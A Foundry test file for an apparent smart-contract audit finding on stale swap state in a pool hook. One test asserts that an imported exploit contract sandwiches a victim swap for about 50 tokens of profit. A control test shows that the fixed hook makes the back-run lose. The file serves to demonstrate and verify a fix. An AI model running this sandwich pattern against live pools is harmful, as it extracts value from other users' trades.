// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    HookFixed,
    Pool,
    Token
} from "./61376-asymmetric-first-in-block-swap-initialization-leads-to-stale.sol";

contract Finding61376Test is Test {
    function test_exploit_backrun_clears_about_50_A() public {
        Exploit e = new Exploit();
        uint256 beforeA = e.tokenA().balanceOf(address(e));
        e.run();
        assertEq(beforeA, 400 ether, "front-run capital");
        assertEq(e.gained(), 49999999999999999998, "searcher net");
        assertEq(e.victimOut(), 47619047619047619047, "victim output");
        assertEq(e.tokenA().balanceOf(address(e)) - beforeA, e.gained());
    }

    function test_control_start_snapshot_makes_the_backrun_lose() public {
        Token tokenA = new Token("Token A", "TKA", 18);
        Token tokenB = new Token("Token B", "TKB", 18);
        Pool pool = new Pool(tokenA, tokenB);
        HookFixed hook = new HookFixed(tokenA, tokenB, pool);
        pool.setHook(address(hook));
        tokenA.mint(address(this), 1500 ether);
        tokenB.mint(address(this), 1000 ether);
        tokenA.approve(address(pool), 1000 ether);
        tokenB.approve(address(pool), 1000 ether);
        pool.seed(1000 ether, 1000 ether);
        tokenA.approve(address(hook), type(uint256).max);
        tokenB.approve(address(hook), type(uint256).max);

        uint256 startA = tokenA.balanceOf(address(this));
        uint256 frontB = hook.swapAforB(400 ether);
        hook.swapAforB(100 ether);
        uint256 backA = hook.swapBforA(frontB);
        assertLt(backA, 400 ether, "back-run still profitable");
        assertLt(tokenA.balanceOf(address(this)), startA, "searcher ended ahead");
    }
}
